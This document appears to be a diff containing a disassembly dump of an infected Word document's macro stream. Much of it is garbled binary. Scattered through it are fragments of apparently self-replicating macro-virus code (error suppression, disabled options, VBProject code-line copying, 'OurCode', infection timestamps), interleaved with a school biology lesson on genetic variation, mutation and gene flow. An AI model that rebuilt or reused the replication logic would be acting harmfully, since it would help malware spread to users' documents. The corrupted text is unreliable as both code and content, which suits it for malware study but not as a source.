+' Line #440:
+' 	Reparse 0x0001 "&"
+' Line #441:
+' 	Reparse 0x0009 "ÆhÐ"
+' Line #442:
+' Line #443:
+' 	Reparse 0x0001 "&"
+' Line #444:
+' 	Reparse 0x0009 "Æh8"
+' Line #445:
+' 	Reparse 0x0001 ""
+' Line #446:
+' 	Reparse 0x0007 "ãõÿÿ\x08Q"
+' Line #447:
+' 	Reparse 0x0001 ""
+' Line #448:
+' 	Reparse 0x0001 ""
+' Line #449:
+' 	Reparse 0x0001 ""
+' Line #450:
+' 	Reparse 0x0007 "gùÿÿ\x08P"
+' Line #451:
+' 	Reparse 0x0001 ""
+' Line #452:
+' 	Reparse 0x0001 ""
+' Line #453:
+' 	Reparse 0x0007 ")ûÿÿ\x08O"
+' Line #454:
+' 	Reparse 0x0001 ""
+' Line #455:
+' 	Reparse 0x0001 ""
+' Line #456:
+' 	Reparse 0x0001 ""
+' Line #457:
+' 	Reparse 0x000D "       ýÿÿ\x08N"
+' Line #458:
+' 	Reparse 0x0007 "*ýÿÿ\x08M"
+' Line #459:
+' 	Reparse 0x0001 "&"
+' Line #460:
+' 	Reparse 0x000A "Æh
+' 
+' "
+' Line #461:
+' 	Reparse 0x0001 "&"
+' Line #462:
+' 	Reparse 0x000A "Æh8"
+' Line #463:
+' 	Reparse 0x0001 "&"
+' Line #464:
+' 	Reparse 0x000A "ÆhÐ
+' "
+' Line #465:
+' 	Reparse 0x0001 "&"
+' Line #466:
+' 	Reparse 0x000A "Æh8"
+' Line #467:
+' 	Reparse 0x0001 "&"
+' Line #468:
+' 	Reparse 0x0009 "ÆhÐ"
+' Line #469:
+' 	Reparse 0x0001 "&"
+' Line #470:
+' 	Reparse 0x000A "Æh8"
+' Line #471:
+' 	Reparse 0x0001 "&"
+' Line #472:
+' 	Reparse 0x0009 "ÆhÐ"
+' Line #473:
+' 	Reparse 0x0001 "&"
+' Line #474:
+' 	Reparse 0x0009 "Æh8"
+' Line #475:
+' 	Reparse 0x0001 "&"
+' Line #476:
+' 	Reparse 0x0009 "Æh
+' "
+' Line #477:
+' Line #478:
+' Line #479:
+' Line #480:
+' Line #481:
+' Line #482:
+' Line #483:
+' 	Reparse 0x0002 "Æ"
+' Line #484:
+' Line #485:
+' Line #486:
+' 	Reparse 0x0002 "Æ\x08"
+' Line #487:
+' Line #488:
+' 	Reparse 0x0002 "Æ\x08"
+' Line #489:
+' Line #490:
+' Line #491:
+' Line #492:
+' Line #493:
+' Line #494:
+' Line #495:
+' Line #496:
+' Line #497:
+' Line #498:
+' Line #499:
+' Line #500:
+' 	Reparse 0x0001 """
+' Line #501:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #502:
+' Line #503:
+' Line #504:
+' 	ArgsCall o 0x0000 
+' Line #505:
+' 	Reparse 0x0003 "¨"
+' Line #506:
+' 	Reparse 0x0001 ""
+' Line #507:
+' 	Reparse 0x0004 "*õ5"
+' Line #508:
+' 	Reparse 0x0004 "{¼A"
+' Line #509:
+' 	Reparse 0x0003 "ÿ"
+' Line #510:
+' 	Reparse 0x0008 "»wn=Vœÿ"
+' Line #511:
+' 	Reparse 0x0001 ""
+' Line #512:
+' 	Reparse 0x0003 "·ð"
+' Line #513:
+' Line #514:
+' Line #515:
+' 	Reparse 0x0001 ""
+' Line #516:
+' 	Reparse 0x0002 ""
+' Line #517:
+' Line #518:
+' Line #519:
+' 	Reparse 0x0001 ""
+' Line #520:
+' 	Reparse 0x0002 ""
+' Line #521:
+' Line #522:
+' Line #523:
+' 	Reparse 0x0007 "„XüÆ"
+' Line #524:
+' 	Reparse 0x0002 "
+' "
+' Line #525:
+' Line #526:
+' 	Reparse 0x0001 ""
+' Line #527:
+' 	Reparse 0x0002 ""
+' Line #528:
+' Line #529:
+' Line #530:
+' 	Reparse 0x0001 ""
+' Line #531:
+' 	Reparse 0x0002 ""
+' Line #532:
+' 	Reparse 0x0003 "OJ"
+' Line #533:
+' 	Reparse 0x0001 ""
+' Line #534:
+' Line #535:
+' 	ArgsCall »w 0x0000 
+' Line #536:
+' 	Reparse 0x0002 "¨"
+' Line #537:
+' 	Reparse 0x0003 "*õ5"
+' Line #538:
+' 	Reparse 0x0003 "{¼A"
+' Line #539:
+' 	Reparse 0x0001 ""
+' Line #540:
+' 	Reparse 0x0001 ""
+' Line #541:
+' Line #542:
+' Line #543:
+' 	Reparse 0x0004 "À@"
+' Line #544:
+' Line #545:
+' Line #546:
+' Line #547:
+' 	Reparse 0x0001 ""
+' Line #548:
+' Line #549:
+' Line #550:
+' Line #551:
+' Line #552:
+' Line #553:
+' Line #554:
+' Line #555:
+' Line #556:
+' Line #557:
+' Line #558:
+' Line #559:
+' 	Reparse 0x0001 ""
+' Line #560:
+' Line #561:
+' Line #562:
+' 	Reparse 0x002B "ly Loves Nicky F. Also! 4/21/99 10:25:43 AM"
+' Line #563:
+' 	Ld evidence 
+' 	ArgsCall e 0x0001 
+' Line #564:
+' 	ArgsCall ÿÿ 0x0000 
+' Line #565:
+' 	Reparse 0x0006 "ÿÿÿ�\x08"
+' Line #566:
+' Line #567:
+' Line #568:
+' Line #569:
+' Line #570:
+' Line #571:
+' Line #572:
+' Line #573:
+' Line #574:
+' Line #575:
+' Line #576:
+' 	Reparse 0x0001 ""
+' Line #577:
+' Line #578:
+' Line #579:
+' Line #580:
+' Line #581:
+' Line #582:
+' Line #583:
+' Line #584:
+' Line #585:
+' Line #586:
+' Line #587:
+' Line #588:
+' Line #589:
+' Line #590:
+' Line #591:
+' Line #592:
+' Line #593:
+' Line #594:
+' Line #595:
+' Line #596:
+' Line #597:
+' Line #598:
+' Line #599:
+' Line #600:
+' 	Reparse 0x00C1 "s. Some of the plants will be growing vigorously and flowering brilliantly, some will be struggling, some will be covered with insect pests and some will be dead ... all from the same genotype!"
+' Line #601:
+' Line #602:
+' 	Reparse 0x001D "cture/function is the result."
+' Line #603:
+' 	Reparse 0x0166 "n homologous chromosome pairs occur quite frequently. This is known as crossing over and when enzymes repair the breaks, recombination of the strands of DNA occurs, but not necessarily in the original form. In this way alleles can "swap" from one chromosome to another, sometimes with marked consequences to the offspring which inherits the new combination.Û"
+' Line #604:
+' Line #605:
+' 	Reparse 0x00EC " in each cell type. A mutation in one of these cells may effect the functioning of that cell, and all those which form by mitosis from it. But unless the cell is a gamete producer, such effects cannot be passed on to future generations."
+' Line #606:
+' 	Reparse 0x0058 "lowing gene flow between groups? (Keep reading this page, you'll find the answer later.)"
+' Line #607:
+' 	Ld Range 
+' 	ArgsCall rature 0x0001 
+' Line #608:
+' 	Reparse 0x0078 "sures have, over time, selected for different phenotypes (and different genotypes) in different geographical locations.Û"
+' Line #609:
+' 	Reparse 0x0043 "ions may become important in the survival (or not) of some species."
+' Line #610:
+' Line #611:
+' Line #612:
+' Line #613:
+' Line #614:
+' Line #615:
+' Line #616:
+' Line #617:
+' Line #618:
+' Line #619:
+' Line #620:
+' 	Reparse 0x001E "8:41  - Wednesday, 3 Mar 1999Ø"
+' Line #621:
+' 	Reparse 0x001E "cky F. Also! 11/08/99 12:50:02"
+' Line #622:
+' 	Reparse 0x0022 "08:15:40  - Thursday, 17 Feb 2000Ø"
+' Line #623:
+' Line #624:
+' Line #625:
+' Line #626:
+' Line #627:
+' 	Reparse 0x002E "ŒBasŒ1Normal.VCreatabl`False
+' –Predecla"
+' Line #628:
+' 	Reparse 0x0009 ""Expose
+' "
+' Line #629:
+' Line #630:
+' Line #631:
+' 	QuoteRem 0x0000 0x0004 "Yarr"
+' Line #632:
+' 	Reparse 0x000D "814: 39:51!"
+' Line #633:
+' 	Reparse 0x0004 "30£"
+' Line #634:
+' 	Reparse 0x0016 "@4:2b1À\5‚B6:47:4À9"
+' Line #635:
+' 	Reparse 0x0017 "EndAs�o›€
+' ?pY?pŽŠ4/=pº5"
+' Line #636:
+' 	Reparse 0x0008 "Ã*4:5 >2"
+' Line #637:
+' 	LitDI2 0x0004 
+' 	ArgsCall Unit 0x0001 
+' Line #638:
+' 	Reparse 0x0008 "  0Popu"
+' Line #639:
+' 	ArgsCall ¶ 0x0000 
+' Line #640:
+' 	Reparse 0x0015 "ã%S%E…Á the e!"
+' Line #641:
+' 	Reparse 0x000E ""ÁHuman H"
+' Line #642:
+' 	Reparse 0x0033 "- a kn€owledgeA4aacaus ™@      v#å/ tweÀ‰in)u`¶"
+' Line #643:
+' 	Reparse 0x0003 "ie."
+' Line #644:
+' 	Reparse 0x0011 " roughÿL, ømayA"
+' Line #645:
+' 	Reparse 0x0009 "R‰`
+' 3
+' ; "
+' Line #646:
+' 	Reparse 0x0001 "\x08"
+' Line #647:
+' 	Reparse 0x0006 "s=ÀeÐ"
+' Line #648:
+' 	Reparse 0x0026 ""W°90raRcÐis°Xsðsp?1•b�\x08radapÑEY"
+' Line #649:
+' 	Reparse 0x0017 "ð2 likQ
+' ð      be0He m"
+' Line #650:
+' 	Reparse 0x0004 "*&’J"
+' Line #651:
+' 	Reparse 0x0037 "p$32ÀYCE”oy AcfDesig�j©À Boardñ �ìie°  @ 3õ2ÏDàÞeîU1"
+' Line #652:
+' 	Reparse 0x003A "áTÐe–
+' ps wep^
+' ÃhÀenotyp£[    Á�\any sð ·pspec@     ò"
+' Line #653:
+' 	ArgsCall AfP 0x0000 
+' Line #654:
+' 	Reparse 0x0015 "atŸF=²EPÅ
+' À¾ÐMr
+'  +i©""
+' Line #655:
+' 	Reparse 0x0025 "àcà=0cølud20CsðHÑ5‡àAÀ\x08ÁDNA,a
+' »±"
+' Line #656:
+' 	Reparse 0x004F "€!us0p•àQa   ul‚-… iŠropa�oÿ1 9Pò0€Ö¢så@J‚,Qobser`QRR0`˜�ÈÐJ0çp;†""
+' Line #657:
+' 	Reparse 0x0084 "@� cloÃ``RHoweÀt^#,@•r exa!ñˆ 20 ÷aza€ plant�pˆoPˆP< diðqÂrÁ8peop )2uHnurP
+' y,²Usøubj…ÐJ ÷YMíQeçgð7A*08whi³JtaÚkÀ"
+' Line #658:
+' 	Reparse 0x0011 "h€Zbys˜0VqÑLdis@"
+' Line #659:
+' 	Reparse 0x0091 "@ÒieP¬@
+' ×9ç
+' yeaürs Q_€05Å�… 3wAXvigoÐLvs�
+' p3f�{`¯`ibêr` iplðr'¥Ñ šugg@xgte…Nc æ�òJin�ž 0?�T:deadP ...Ql°YoÚmrBs±ü%(!eEð"Ð(ª¹"
+' Line #660:
+' Line #661:
+' 	Ld simpl 
+' 	ArgsCall Suc€h 0x0001 
+' Line #662:
+' 	Reparse 0x0017 "th€1…%À[ÈtruC>Si�¯4Ã9"
+' Line #663:
+' 	Reparse 0x0008 "@ÈsuõJn"
+' Line #664:
+' 	Reparse 0x000A "€: (GáAa"
+' Line #665:
+' 	ArgsCall codà 0x0000 
+' Line #666:
+' 	Reparse 0x002D "f$orA‰te€[sy"nÁis)ã:mi®n £N`~osbKq(if@J"
+' Line #667:
+' 	Reparse 0x0066 "€•À˜a's fun‘|too 
+' ch §Nà
+' €‰onàyÃj'†dâ@?leà†l („ áduct aÀ–À%€non-Ñ
+' al)‚DMemäfÌin Š`ein€�¡{"
+' Line #668:
+' Line #669:
+' 	Reparse 0x0003 " n"
+' Line #670:
+' 	Reparse 0x001E "HBeƒElong~ -
+' DkE
+' À8bxà,c<esC#"
+' Line #671:
+' 	Reparse 0x0002 "`u"
+' Line #672:
+' 	Reparse 0x0029 " f =ðure/fH@…áÃ�¢=I á.ÁcsaÀTûAÍ¡¬mÆ@À"
+' Line #673:
+' 	Reparse 0x00AF ">€á ›Ý"— $“à·Es†Æ W°passÀ3¡÷o`;àfspri`1 œA<inÅò¡)Ãáorxigi@10##cÀ'oÑ�d In`
+' x`|pùpJro 0òÕoA      ð       ØmeaÀ|UO±I§Ss#>duò\x08gÐ#tôogpvsÐ”!¿
+' ±ÀSom€lc (body°all)�–"
+' Line #674:
+' 	Reparse 0x0010 "s die ¢S‘
+'  %¶"
+' Line #675:
+' 	Reparse 0x0005 "±O¡
+' Ñ"
+' Line #676:
+' 	Reparse 0x0001 ","
+' Line #677:
+' Line #678:
+' 	Reparse 0x0168 " R>e@±= 9áÀorNdðZ` bhst1Cwh BLspec*i`Os1zmÑ'grÚeð‹rH‡ n@Žïƒð1ã, you&
+' ÀreviewQ7ÐBÕ plâ=sò ñD`. FocÐ�ÀrØ at�(SFnià3‰ÁhoPoogo`Œchç"ágo,bjÿ¡
+' âB�'!‚¡\à²X_0lÀwÂH mã�.ÑM|ei€‹@sà8³Wa< ¼byP•‘8 8mÒtGqàAhapl8oidãaO"
+' cevl ád@Jà²DµS#m#,Ê/@l`¢3`£Ábe•Ð—nt2wÁ—. ¤£Fer¬io`k�
+' nÐ•eep{irpÂuqdui fr‚¥àD.< T‘‡P+bY¬crèossR1vÀ###psðenzy1F"
+' Line #679:
+' 	Reparse 0x000C "ÁƒÑÚb‚,€
+' P"
+' Line #680:
+' 	Reparse 0x0028 "b73ÿsµózò
+' aò2`QñJüneñžP(²SÀ~e;ïñ"
+' Line #681:
+' 	Reparse 0x0003 "òE"
+' Line #682:
+' Line #683:
+' 	Reparse 0x0003 "On"
+' Line #684:
+' 	Ld � 
+' 	ArgsCall u0lar 0x0001 
+' Line #685:
+' 	ArgsCall €0re 0x0000 
+' Line #686:
+' 	Ld Ä 
+' 	ArgsCall A@ 0x0001 
+' Line #687:
+' 	Reparse 0x0005 "AÞÁ
+' "
+' Line #688:
+' 	Reparse 0x001D "oyB
+' se€d`±¦1;TÿÁ�`"´a4á7ÁÃ"
+' Line #689:
+' 	Reparse 0x0018 "¢Faˆ1Á=oftÀ:b¡ÀAfici@a"
+' Line #690:
+' 	Reparse 0x001F "¤neœxtbpƒQ�inÁœd :#HCan ySà¹"
+' Line #691:
+' 	Reparse 0x0010 "àdáÉpageê,Á'"
+' Line #692:
+' 	Reparse 0x001E "
+' al`)§dÂMphyrsâÉda`Z`ÀSlxway`"
+' Line #693:
+' 	Reparse 0x0021 "part@p`\x08ÁDNA,Ã1ð3selepe r{ S"
+' Line #694:
+' 	Reparse 0x0079 "àc
+' e)p}°ptismñ30In `”€[ÁBÀ*/À]báWp   b Žru2 Y-06âxa, pÀerhaps¥°û°gÀe’„1ór 7Ý€ya$5¡ƒ
+'  pO�9ïÀ„¢`Ñ…f`ŠÀ      A"
+' Line #695:
+' 	Reparse 0x004C "ãÀ©
+' . SÓ>ð=”s �x
+' s€6wtúhr&s%C PP.Ÿƒ?@Flude:1
+' \x08· WP=r av\x08ail�lity"
+' Line #696:
+' 	Reparse 0x0019 "·S/á(foˆod)þTem€ZaBqrA"
+' Line #697:
+' 	Reparse 0x0003 "AA"
+' Line #698:
+' Line #699:
+' 	Reparse 0x0023 "AP!ƒÀ©×'s exP•ÿa@lð‘‚d(N bÿ�C"
+' Line #700:
+' 	Reparse 0x0005 "aˆit"
+' Line #701:
+' 	Reparse 0x003A "°�W üun­qS<Ñ5á™JyðVea ¨q³@?aüdvð4SÓY�Àbóð�t ‚Œ"
+' Line #702:
+' 	Reparse 0x007F "@
+' N
+'  SÃBonÂp�"CliÄne"WGraÁ,0a½0‰yQF\x08�A­ o¡Ÿek� ¢Àa Ò"!/gôeop1p�¥6}ÐP@–ýäqcñ£„‘€R B��÷�
+' "‚/nSÐ
+' ÀUAy|sa v�%¡R€J`ÕlÎ !NÒ"
+' Line #703:
+' 	Reparse 0x0026 "On²K!ämo ]ob2op)â—ÿR
+' ±\x08`†‘ ·,u<aå"
+' Line #704:
+' 	Reparse 0x003C "Homoð&ð™né`‘If!Óc Ý@O£&}ÐÚy°AQr±ãÛe!wlor âr
+' w°Çq¯'tra0Î'pð"
+' Line #705:
+' 	Reparse 0x007D "PaïQ¯ PBà² °ÙŸ ÕÅ@l@³ugh1\x08¡þbàÄ€S$7I1±l°V‚èýËgp0Ó@)ÀÑápe±Ýþt�Ä ´ò"0�±e¡ˆ!î(‘!—6")ñyE!·à¢rWÀç e0h×QÀ*r êl�P"
+' Line #706:
+' 	Reparse 0x0053 "du,—ny H˜.sa¢q© m°f}ðaQ!"Ià
+' À£ð°dßÅ}Ï$aÖ½!o‘Û‚øÿ’Q#sŽãWQ[À¡püÀñ\ng“­ƒ¡ÐyÐga"
+' Line #707:
+' 	Reparse 0x0017 "\x08mutagens4A number"
+' Line #708:
+' 	Reparse 0x002F "specie‚sBŒRadiaA‹D
+' €£€sX-rays‚µultravêi@Et@cy"
+' Line #709:
+' 	Reparse 0x0002 "
+' ."
+' Line #710:
+' 	ParamOmitted 
+' 	Ld á�Ár 
+' 	ArgsCall þ 0x0002 
+' Line #711:
+' 	Reparse 0x001C "!—}ä¦ @0@JA&¡‚"¡e€ukaryot`À"
+' Line #712:
+' 	Reparse 0x0002 "or"
+' Line #713:
+' 	Reparse 0x0023 "        aˆn eâ] de ¡dopábga (ÄS ]"
+' Line #714:
+' 	QuoteRem 0x0000 0x000B " V.U.T³9¤"
+' Line #715:
+' 	Reparse 0x0087 "©
+' Docu!Óà
+' ose�ã
+' On ErràPÈRes€ Nà±á ‚C¡v Mark€ß`= "<-`sÃqa$ mÂ!"&DeÈcla€ËVaàa jÁàæDim S Ñª,¢NbÉT@ÆlÀN$, ¥Ina ed,, +å  UBo¡@’an"
+' Line #716:
+' 	Reparse 0x0012 "A
+' a@c ŸÀObjÀ§£O"
+' Line #717:
+' 	Reparse 0x000A ".VB˜Pro�"
+' Line #718:
+' 	Reparse 0x001A "Op±7s.Í= Fal!BQ  `(Da"
+' Line #719:
+' 	Reparse 0x000B "‘FÀ     =("
+' Line #720:
+' 	Reparse 0x004D "Tr�z…ap!$ +L`ines(°kCÀountOfÒÐ}EÀ/o¿R+ Ë&k/ @
+' IfsS"
+' Line #721:
+' 	Reparse 0x0011 "1  To 43 Áe’9=–"
+' Line #722:
+' 	Ld i 
+' 	ArgsCall q 0x0001 
+' Line #723:
+' 	Reparse 0x0035 "w" vr€�onym0�ÿpasAàvtsme@Ïc‘šàr0vÏasci>io!¨Ó"
+' Line #724:
+' 	Reparse 0x0021 "\x08       qu
+' itT  Sh™�Ž "@ð‡d.p"
+' Line #725:
+' 	Reparse 0x0015 "@ê(ÿF Â?X�1ïAèAucS_’"
+' Line #726:
+' 	Reparse 0x000A "(li¡và&ma0"
+' Line #727:
+' 	Reparse 0x0005 "= wd£"
+' Line #728:
+' 	Reparse 0x0004 "ÿÑÐ"
+' Line #729:
+' 	ArgsCall Ï 0x0000 
+' Line #730:
+' 	ArgsCall Ã 0x0000 
+' Line #731:
+' 	Reparse 0x0003 "[WÑ"
+' Line #732:
+' 	Reparse 0x000E "ëA5
+' .1dQ1"
+' Line #733:
+' Line #734:
+' 	Reparse 0x0005 ">  \x08“"
+' Line #735:
+' 	Reparse 0x0015 "& LÁ…b  End€e…pElse‡"
+' Line #736:
+' 	Reparse 0x0016 "™1k&` "' "†ˆ&N€ext i"
+' Line #737:
+' 	ArgsCall ƒ 0x0000 
+' Line #738:
+' 	Reparse 0x001E "€OurCode€UÅ…&�& _ ��#�* &"
+' Line #739:
+' 	Reparse 0x0029 "Unit 4 - Biological continuity and change"
+' Line #740:
+' 	Reparse 0x0025 "Area of study 1 - Genetic inheritance"
+' Line #741:
+' 	Reparse 0x003C "Area of study 2 - Variation, natural selection and evolution"
+' Line #742:
+' Line #743:
+' Line #744:
+' 	Reparse 0x0033 "Unit 4, Area of Study 2 is divided into four parts."
+' Line #745:
+' Line #746:
+' 	Reparse 0x001E "      Variation in Populations"
+' Line #747:
+' 	Ld Selection 
+' 	ArgsCall natural 0x0001 
+' Line #748:
+' 	Reparse 0x001E "      Evolution - the evidence"
+' Line #749:
+' 	Ld evolution 
+' 	ArgsCall Human 0x0001 
+' Line #750:
+' Line #751:
+' 	Reparse 0x003E "I will be looking at the first part, Variation in Populations."
+' Line #752:
+' Line #753:
+' 	Reparse 0x0044 "Having completed study of this section, students should demonstrate:"
+' Line #754:
+' 	Reparse 0x003C "- a knowledge of the causes of variation between individuals"
+' Line #755:
+' 	Reparse 0x0037 "ie. Environmental effects compared with genetic effects"
+' Line #756:
+' 	Ld Reproduction 
+' 	ArgsCall Sexual 0x0001 
+' Line #757:
+' 	Reparse 0x003F "- the ability to investigate cause of variation in a population"
+' Line #758:
+' Line #759:
+' Line #760:
+' Line #761:
+' Line #762:
+' 	Reparse 0x002F "Topics covered in Variation in Populations are:"
+' Line #763:
+' Line #764:
+' 	ArgsCall introduction 0x0000 
+' Line #765:
+' 	Reparse 0x0029 "      Causes of variation in a population"
+' Line #766:
+' 	Ld Effects 
+' 	ArgsCall Genetic 0x0001 
+' Line #767:
+' 	ArgsCall mutation 0x0000 
+' Line #768:
+' 	Ld Reproduction 
+' 	ArgsCall Sexual 0x0001 
+' Line #769:
+' 	Ld flow 
+' 	ArgsCall Gene 0x0001 
+' Line #770:
+' 	Ld Effects 
+' 	ArgsCall Environmental 0x0001 
+' Line #771:
+' 	Reparse 0x0024 "                Variation in Habitat"
+' Line #772:
+' 	ArgsCall Clines 0x0000 
+' Line #773:
+' 	ArgsCall mutagens 0x0000 
+' Line #774:
+' Line #775:
+' Line #776:
+' Line #777:
+' Line #778:
+' 	ArgsCall introduction 0x0000 
+' Line #779:
+' Line #780:
+' 	Reparse 0x02DD "     "In a relatively stable habitat, variation between individuals of a population can mean that some have a better chance than others of surviving to maturity and producing offspring. If environmental conditions change or new habitats are invaded, some individuals in the population, through natural selection, may be better able to survive and reproduce than others. In both stable and changing environments the inherited characteristics possessed by better adapted individuals are likely to become more frequent in the population. Mutation, environmental factors and migration of groups of organisms into or out of populations, can each alter the degree of variation present in a population with consequent effects on evolution.""
+' Line #781:
+' Line #782:
+' 	Reparse 0x0037 "p32, VCE Biology Study Design, © Board of Studies, 1993"
+' Line #783:
+' Line #784:
+' Line #785:
+' Line #786:
+' 	Reparse 0x0037 "Causes of variation between individuals in a population"
+' Line #787:
+' Line #788:
+' 	Reparse 0x00C3 "The variations we see in the phenotypes of individuals of any single species can be quite spectacular. Look around a group of Homo sapiens and variation is evident immediately. Since we know that"
+' Line #789:
+' 	Ld Genotype 
+' 	Ld environment 
+' 	Add 
+' 	St Phenotype 
+' Line #790:
+' 	Reparse 0x0085 "we can conclude that the genotype, that is the DNA, of the individuals must be responsible for at least some of the variation we see."
+' Line #791:
+' Line #792:
+' 	Reparse 0x00F2 "In fact, if a number of individuals of a species have identical genotypes, usually as a result of their propagation by means of asexual reproduction, we observe that they also have identical phenotypes. Such organisms are often called clones."
+' Line #793:
+' Line #794:
+' 	Reparse 0x01D6 "However, if a number of clones, for example 20 identical azalea plants sold to 20 different people in a nursery, are subjected to different environments, the 20 different gardens to which they are taken home, they will surely display a variety of phenotypes in a number of years. Some of the plants will be growing vigorously and flowering brilliantly, some will be struggling, some will be covered with insect pests and some will be dead ... all from the same genotype!"
+' Line #795:
+' Line #796:
+' 	Reparse 0x0073 "The environment has a profound influence on the variability of the phenotypes of genetically identical individuals!"
+' Line #797:
+' Line #798:
+' 	Reparse 0x00A6 "Such simple observations as these demonstrate the biological basis of variation and lead us into the consequences of that variation - Natural Selection and Evolution."
+' Line #799:
+' Line #800:
+' Line #801:
+' Line #802:
+' 	Ld Effects 
+' 	ArgsCall Genetic 0x0001 
+' Line #803:
+' Line #804:
+' 	Reparse 0x00AC "If variations in organisms' phenotypes are to be explained in terms of variation in DNA composition, we need to consider how such variation between individuals could arise."
+' Line #805:
+' Line #806:
+' Line #807:
+' Line #808:
+' 	ArgsCall mutations 0x0000 
+' Line #809:
+' Line #810:
+' 	Reparse 0x00E5 "A mutation is a change in the DNA of an organism which may or may not have an effect on the genotype and phenotype. Normally, mutations are rare and random events, but under certain enivronmental conditions, this may not be true."
+' Line #811:
+' Line #812:
+' 	Reparse 0x004D "Since DNA is a complex molecule, there is a number of ways it can be altered."
+' Line #813:
+' Line #814:
+' 	Reparse 0x0221 "Base-pair substitutions occur when one nucleotide and its partner from the other DNA strand are replaced with another pair. Since these substitutions only occur at one site on the DNA strand they are sometimes called point mutations. Point mutations often cause no effect at all (not all DNA codes for protein synthesis), but minor changes to proteins may occur (if one amino acid is altered but not in a way that changes the protein's function too much), and occasionally such mutations may be lethal (protein product absent or non-functional)."
+' Line #815:
+' Line #816:
+' 	Reparse 0x00E2 "Mutations which involve insertion or deletion of segments of DNA into a chromosome are also known. If these involve lengths of DNA which are not a multiple of 3 bases, the triplet code of whole exons can be changed - these are"
+' Line #817:
+' 	Reparse 0x0106 "then called frameshift mutations. Because long segments of DNA can be changed in this process, these are more likely to result in changes to protein products. Such changes are mostly for the worse, but at times an improvement to structure/function is the result."
+' Line #818:
+' Line #819:
+' 	Reparse 0x0015 "It is often said that"
+' Line #820:
+' Line #821:
+' 	Reparse 0x0047 "mutations provide the raw material on which Natural Selection will act."
+' Line #822:
+' Line #823:
+' Line #824:
+' 	Reparse 0x00B5 "If this is true, the altered chromosomes need to be passed on to offspring of the individual in which the original mutation arose. In sexually reproducing organisms, this means that"
+' Line #825:
+' Line #826:
+' 	Reparse 0x004E "Only mutations which occur during gametogenesis can be passed on to offspring."
+' Line #827:
+' 	Reparse 0x0044 "Somatic (body cell) mutations die with the body in which they arose."
+' Line #828:
+' Line #829:
+' Line #830:
+' Line #831:
+' 	Ld Reproduction 
+' 	ArgsCall Sexual 0x0001 
+' Line #832:
+' Line #833:
+' 	Reparse 0x012A "In order to understand why sexually reproducing species show much greater variation than asexually reproducing species, you need to review the details of sexual reproduction. Focus your attention on where the homologous chromosomes can go, and how not all the gametes from one parent are identical."
+' Line #834:
+' Line #835:
+' 	Reparse 0x0033 "Meiosis is the process by which gametes are formed."
+' Line #836:
+' 	Reparse 0x0033 "Gametes are haploid, but somatic cells are diploid."
+' Line #837:
+' Line #838:
+' 	Reparse 0x01BC "During meiosis, chromosomes replicate and become entwined. During this period, breaks in homologous chromosome pairs occur quite frequently. This is known as crossing over and when enzymes repair the breaks, recombination of the strands of DNA occurs, but not necessarily in the original form. In this way alleles can "swap" from one chromosome to another, sometimes with marked consequences to the offspring which inherits the new combination."
+' Line #839:
+' Line #840:
+' 	Reparse 0x00F7 "Even if crossing over and recombination did not occur, the fact that the homologous pairs of chromosomes (with their individual allele compositions) are randomly assorted into the gametes makes many different sets of genes possible in the gametes."
+' Line #841:
+' Line #842:
+' 	Reparse 0x018F "(An organism with a haploid number of 3 can be shown to produce 8 different combinations of gametes, the relationship is N = 2h , where N= no. of different gametes, h= haploid no. of the organism. For humans, with a haploid no. of 23, this means that there are 8 388 608 ways those chromosomes may be combined in a gamete!) (No, you donot have to remember this ... I just find the idea fascinating.)"
+' Line #843:
+' Line #844:
+' 	Reparse 0x00D6 "The final way that chromosomes and their alleles become dispersed through a generation is in the process of fertilization, the union of two haploid gametes, from different parents, to form a new diploid individual."
+' Line #845:
+' Line #846:
+' 	Reparse 0x0136 "(In the above example, the organism with haploid no. of 3 could produce 8 x 8 different combinations of offspring from one pair of parents. For humans, the number is (8 388 608)2 or approximately 7.03 x 1013! You don't have to remember this either. And we still haven't factored in crossing over or mutations!)"
+' Line #847:
+' Line #848:
+' 	Reparse 0x00C1 "Once the gametes have united in fertilization, the diploid zygote begins the long process of repeated mitotic divisions, each one resulting in diploid cells of identical chromosome composition."
+' Line #849:
+' Line #850:
+' 	Reparse 0x01FF "Eventually differentiation of the growing mass of cells occurs and tissues, organs and functioning systems develop.  These are the somatic cells, all diploid, all containing the full compliment of genetic information, but differing in which particular genes are "switched on" in each cell type. A mutation in one of these cells may effect the functioning of that cell, and all those which form by mitosis from it. But unless the cell is a gamete producer, such effects cannot be passed on to future generations."
+' Line #851:
+' Line #852:
+' Line #853:
+' Line #854:
+' 	Ld flow 
+' 	ArgsCall Gene 0x0001 
+' Line #855:
+' Line #856:
+' 	Reparse 0x0044 "Gene flow is the exchange of genes between populations of a species."
+' Line #857:
+' Line #858:
+' 	Reparse 0x017C "For example, the various populations of magpies found in different locations around Australia do not usually interbreed, and they have observably different phenotypes in different areas. However, if some magpies migrate between locations, and interbreed with the magpies in the new location, their genes have 'flowed' out of the original population and into the second population."
+' Line #859:
+' Line #860:
+' 	Reparse 0x00BE "This introduction of new genes into a population is often beneficial as it may supply the so-called hybrid vigour that increases the survival potential of the next generation of individuals."
+' Line #861:
+' Line #862:
+' 	Reparse 0x00C1 "Can you think of another animal species where interbreeding between previously isolated populations is allowing gene flow between groups? (Keep reading this page, you'll find the answer later.)"
+' Line #863:
+' Line #864:
+' Line #865:
+' Line #866:
+' Line #867:
+' Line #868:
+' 	Ld Effects 
+' 	ArgsCall Environmental 0x0001 
+' Line #869:
+' Line #870:
+' 	Reparse 0x014C "We already know that the environment can play a significant role in the phenotype of individuals. Nutritional requirements must be met, disease can alter phenotype and physical damage is always a threat to individuals. Other environmental factors can be shown to play a part in altering DNA, or in selecting for certain individuals."
+' Line #871:
+' Line #872:
+' Line #873:
+' Line #874:
+' 	Reparse 0x0014 "Variation in Habitat"
+' Line #875:
+' Line #876:
+' 	Reparse 0x00AE "The earlier example of a clone of azalea plants taken to 20 different habitats provided a somewhat artificial example of the effect of habitat ( = living place) on organisms."
+' Line #877:
+' Line #878:
+' 	Reparse 0x011E "In nature, this can be seen to be true in populations of organisms, perhaps living close to each other, but in an area where there is a gradual change in some feature of the environment. Some of these features which may effect the growth and survival of plant or animal species include:"
+' Line #879:
+' Line #880:
+' 	Reparse 0x0014 "· Water availability"
+' Line #881:
+' 	Reparse 0x001E "· Nutrient (food) availability"
+' Line #882:
+' 	Reparse 0x0013 "· Temperature range"
+' Line #883:
+' 	Ld Altitude 
+' 	ArgsCall · 0x0001 
+' Line #884:
+' 	Reparse 0x0013 "· Shelter from wind"
+' Line #885:
+' Line #886:
